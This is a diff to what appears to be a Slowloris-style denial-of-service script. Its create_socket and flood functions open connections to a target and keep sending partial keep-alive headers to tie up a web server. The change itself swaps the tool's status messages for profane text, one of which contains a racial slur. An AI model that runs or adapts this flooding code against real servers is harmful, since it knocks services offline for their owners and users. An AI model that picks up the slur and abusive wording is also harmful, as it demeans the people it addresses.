@@ -19,11 +19,11 @@ def create_socket(target):
         )
         sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     except socket.timeout:
-        print(f"{Fore.RED}[-] {Fore.MAGENTA}Timed out..{Fore.RESET}")
+        print(f"{Fore.RED}[-] {Fore.MAGENTA}timed out go fix yo shi{Fore.RESET}")
     except socket.error:
-        print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed create socket{Fore.RESET}")
+        print(f"{Fore.RED}[-] {Fore.MAGENTA}man fuck yo socket i couldnt do that shit{Fore.RESET}")
     else:
-        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] {Fore.YELLOW}yo socket is ready ma niga{Fore.RESET}")
         return sock
 
 
@@ -42,7 +42,7 @@ def flood(target):
                 sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
             except socket.error:
                 print(
-                    f"{Fore.RED}[-] {Fore.MAGENTA}Failed to send keep-alive headers{Fore.RESET}"
+                    f"{Fore.RED}[-] {Fore.MAGENTA}these dumbass keep-alive headers failed to be sent{Fore.RESET}"
                 )
                 sockets.remove(sock)
             else:
